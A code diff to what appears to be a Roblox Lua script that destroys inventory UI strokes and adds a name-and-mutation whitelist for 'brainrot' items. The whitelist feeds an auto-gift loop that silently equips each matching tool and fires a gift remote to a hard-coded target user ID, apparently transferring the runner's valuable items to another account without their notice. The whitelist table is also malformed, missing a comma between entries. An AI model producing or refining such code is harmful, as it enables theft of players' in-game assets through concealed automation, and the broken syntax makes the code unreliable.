@@ -167,9 +167,10 @@ end)
 local inv = player.PlayerGui:WaitForChild("NewInventory")
 
 
+-- Method 3
 for _,v in ipairs(inv:GetDescendants()) do
     if v:IsA("UIStroke") then
-        v.Enabled = false -- bukan Destroy()
+        v:Destroy()
     end
 end
 
@@ -313,6 +314,65 @@ local function isWeightTool(tool)
 end
 
 --====================================================
+-- 🧾 BRAINROT WHITELIST (NAME + MUTATION)
+--====================================================
+
+local brainrotWhitelist = {
+    ["Strawberry Elephant"] = {
+        mutations = {
+            radioactive = true
+        }
+    },
+
+    ["Dragonfrutina Dolphinita"] = {
+        mutations = {
+            normal = true,
+            diamond = true
+        }
+    }
+    
+    ["Ketupat Kepat"] = {
+    mutations = {
+        ["*"] = true -- semua mutation termasuk normal
+    }
+}
+}
+
+local function getMutation(tool)
+    local m = tool:GetAttribute("Mutation")
+
+    if not m or m == "" then
+        return "normal"
+    end
+
+    m = string.lower(tostring(m))
+
+    if m == "none" then
+        return "normal"
+    end
+
+    return m
+end
+
+local function isWhitelistedName(tool)
+    return brainrotWhitelist[tool.Name] ~= nil
+end
+
+local function isWhitelisted(tool)
+    local data = brainrotWhitelist[tool.Name]
+    if not data then return false end
+
+    local mutation = getMutation(tool)
+
+    -- 🔥 wildcard (semua mutation)
+    if data.mutations["*"] then
+        return true
+    end
+
+    return data.mutations[mutation] == true
+end
+
+--====================================================
 -- AUTO GIFT LOOP
 --====================================================
 
@@ -321,16 +381,16 @@ task.spawn(function()
         task.wait(0.01)
 
         for _,tool in ipairs(backpack:GetChildren()) do
-            if tool:IsA("Tool") and not isWeightTool(tool) then
+    if tool:IsA("Tool") 
+    and not isWeightTool(tool)
+    and isWhitelistedName(tool) then
 
                 silentEquip(tool)
                 task.wait(0.02)
 
-                local rarity = getRarity(tool)
-
-                if rarity == "og" or rarity == "celestial" then
-                    giftRemote:FireServer(targetUserId)
-                end
+                if isWhitelisted(tool) then
+    giftRemote:FireServer(targetUserId)
+end
 
                 unequipAll()
             end
